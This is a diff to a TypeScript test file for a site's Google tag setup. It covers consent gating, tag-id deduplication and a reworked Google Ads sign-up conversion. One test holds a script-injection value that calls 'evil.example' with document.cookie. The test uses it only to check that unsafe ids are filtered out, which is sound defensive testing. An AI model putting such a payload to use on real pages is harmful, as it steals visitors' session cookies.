@@ -59,16 +59,27 @@ test('Ads id only: still one loader, GA4 default plus Ads, Ads behaviour unchang
 })
 
 test('old variable holding the same G- id is not loaded twice; a different G- id is kept once', () => {
-  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: GA4 }).configIds, [GA4])
-  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: '', legacyEnv: GA4 }).configIds, [GA4])
+  // (the Tutafy Ads id is always configured too, once: see the next test)
+  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: GA4 }).configIds, [GA4, ADS])
+  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: '', legacyEnv: GA4 }).configIds, [GA4, ADS])
   const { layer } = boot(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: GA4 }).configIds)
-  assert.equal(layer().filter(c => c[0] === 'config').length, 1)
-  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: 'G-OTHER12' }).configIds, [GA4, 'G-OTHER12'])
+  assert.deepEqual(layer().filter(c => c[0] === 'config').map(c => c[1]), [GA4, ADS], 'GA4 configured once')
+  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', ga4Env: GA4, legacyEnv: 'G-OTHER12' }).configIds, [GA4, 'G-OTHER12', ADS])
+})
+
+test('the Ads id is configured exactly once whatever the old variable holds, so the conversion has its destination', () => {
+  assert.equal(tag.ADS_ID, ADS)
+  for (const legacyEnv of [undefined, '', ADS, `${ADS}\n`, 'AW-OTHER123']) {
+    const ids = tag.googleTagPlan({ consent: 'accepted', legacyEnv }).configIds
+    assert.equal(ids.filter(id => id === ADS).length, 1, String(legacyEnv))
+    assert.equal(new Set(ids).size, ids.length, 'no id twice')
+  }
+  assert.equal(tag.googleTagPlan({ consent: 'declined' }).configIds.length, 0, 'still nothing without Accept')
 })
 
 test('an id that is not a tag id never reaches the page script', () => {
   const evil = `AW-1');fetch('//evil.example/'+document.cookie);//`
-  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', legacyEnv: evil }).configIds, [GA4])
+  assert.deepEqual(tag.googleTagPlan({ consent: 'accepted', legacyEnv: evil }).configIds, [GA4, ADS])
   assert.ok(!tag.googleTagBootstrapScript([evil, ADS]).includes('evil'))
 })
 
@@ -122,10 +133,89 @@ test('Analytics.tsx: renders only after Accept, loads gtag.js through the plan e
   assert.ok(src.includes('process.env.NEXT_PUBLIC_GA_MEASUREMENT_ID'))
 })
 
-test('Ads conversion at onboarding is unchanged, and sign_up is gated by consent', () => {
+// ---- the Google Ads sign-up conversion (T-0624) ----------------------------------------------
+// gtag.js reads only the `arguments` object that gtag() pushes; an array pushed by hand
+// (the old onboarding line) is ignored, so the conversion was probably never recorded.
+
+const LABEL = 'AW-18335043737/SHlACJ_tptgcEJmh6qZE'
+const isArguments = (x: unknown) => Object.prototype.toString.call(x) === '[object Arguments]'
+
+/** The dataLayer of a window as raw entries (not copied), so their real kind can be checked. */
+const rawLayer = (ctx: Record<string, unknown>) => Array.from(ctx.dataLayer as ArrayLike<unknown>)
+const conversions = (ctx: Record<string, unknown>) =>
+  rawLayer(ctx).filter(e => isArguments(e) && (e as ArrayLike<unknown>)[0] === 'event' && (e as ArrayLike<unknown>)[1] === 'conversion')
+
+test('the conversion label is the one the owner set up, unchanged', () => {
+  assert.equal(tag.ADS_SIGNUP_CONVERSION, LABEL)
+})
+
+test('conversion: not sent, not queued and not pushed without Accept', () => {
+  for (const consent of [null, 'declined'] as const) {
+    const win: Record<string, unknown> = {}
+    tag.sendAdsSignupConversion(win, consent)
+    assert.equal(win.dataLayer, undefined)
+    assert.equal(win.__tutafyGtagPending, undefined)
+    // even when gtag is already running, a visitor who did not accept gets nothing
+    const { ctx } = boot([GA4, ADS])
+    const before = rawLayer(ctx).length
+    tag.sendAdsSignupConversion(ctx, consent)
+    assert.equal(rawLayer(ctx).length, before)
+    assert.equal(conversions(ctx).length, 0)
+  }
+})
+
+test('conversion after Accept, before gtag started: waits, then dataLayer holds exactly one arguments entry for it, after config', () => {
+  const win: Record<string, unknown> = {}
+  tag.sendAdsSignupConversion(win, 'accepted')
+  assert.equal(win.dataLayer, undefined, 'nothing is pushed before gtag has been set up')
+
+  const { ctx, layer } = boot([GA4, ADS], win)
+  const found = conversions(ctx)
+  assert.equal(found.length, 1)
+  assert.deepEqual(Array.from(found[0] as ArrayLike<unknown>).slice(0, 2), ['event', 'conversion'])
+  assert.deepEqual({ ...(Array.from(found[0] as ArrayLike<unknown>)[2] as object) }, { send_to: LABEL })
+  assert.equal(Array.from(found[0] as ArrayLike<unknown>).length, 3)
+  const names = layer().map(c => c[0] === 'event' ? `event:${c[1]}` : String(c[0]))
+  assert.deepEqual(names, ['js', 'config', 'config', 'event:conversion'], 'config for the Ads id comes first')
+  // every entry gtag.js will read is an arguments object; no entry is a plain array
+  for (const e of rawLayer(ctx)) assert.ok(isArguments(e), 'a dataLayer entry is not an arguments object')
+})
+
+test('conversion after Accept, gtag already running: goes straight in as one arguments entry', () => {
+  const { ctx } = boot([GA4, ADS])
+  tag.sendAdsSignupConversion(ctx, 'accepted')
+  assert.equal(conversions(ctx).length, 1)
+  for (const e of rawLayer(ctx)) assert.ok(isArguments(e))
+})
+
+test('the conversion carries the label only: no personal data, no other parameter', () => {
+  const win: Record<string, unknown> = {}
+  tag.sendAdsSignupConversion(win, 'accepted')
+  assert.deepEqual(win.__tutafyGtagPending, [['event', 'conversion', { send_to: LABEL }]])
+  assert.ok(!/@|email|name|user_id|phone/i.test(JSON.stringify(win.__tutafyGtagPending)))
+})
+
+test('the check itself tells the old array shape from a real gtag call (a self-check)', () => {
+  const old: Record<string, unknown> = { window: undefined }
+  old.window = old
+  vm.runInNewContext(`dataLayer=[];dataLayer.push(['event','conversion',{send_to:'${LABEL}'}])`, old)
+  assert.equal(conversions(old).length, 0, 'the array pushed by hand is not counted as a conversion')
+  assert.ok(!isArguments(rawLayer(old)[0]))
+})
+
+test('onboarding calls the helper once, inside the sign-up branch, and never touches dataLayer itself', () => {
   const src = read('src/app/onboarding/page.tsx')
-  assert.ok(src.includes(`w.dataLayer.push(['event', 'conversion', { send_to: 'AW-18335043737/SHlACJ_tptgcEJmh6qZE' }])`))
-  assert.ok(src.includes(`sendGaEvent(window, getConsent(), 'sign_up')`))
+  const code = src.replace(/^\s*\/\/.*$/gm, '')
+  assert.ok(!/dataLayer/.test(code), 'no hand-written dataLayer push')
+  assert.ok(!/AW-/.test(code), 'the id and label live in google-tag.ts only')
+  assert.equal((code.match(/sendAdsSignupConversion\(/g) ?? []).length, 1, 'exactly one call')
+  assert.ok(/import \{[^}]*sendAdsSignupConversion[^}]*\} from '@\/lib\/google-tag'/.test(code))
+  assert.ok(code.includes(`sendAdsSignupConversion(window, getConsent())`))
+  assert.ok(code.includes(`sendGaEvent(window, getConsent(), 'sign_up')`))
+  const branch = code.slice(code.indexOf(`params.get('signup') === '1'`))
+  assert.ok(branch.indexOf('sendAdsSignupConversion(') > 0 && branch.indexOf('sendAdsSignupConversion(') < branch.indexOf('replaceState'), 'sent before the address is cleaned, once per sign-up')
+  assert.equal((read('src/lib/google-tag.ts').match(/SHlACJ_tptgcEJmh6qZE/g) ?? []).length, 1, 'the label is written once')
+  assert.ok(!/SHlACJ_tptgcEJmh6qZE|AW-18335043737/.test(read('src/components/Analytics.tsx')))
 })
 
 test('begin_checkout is sent from the one function every Go Pro button calls, gated by consent', () => {
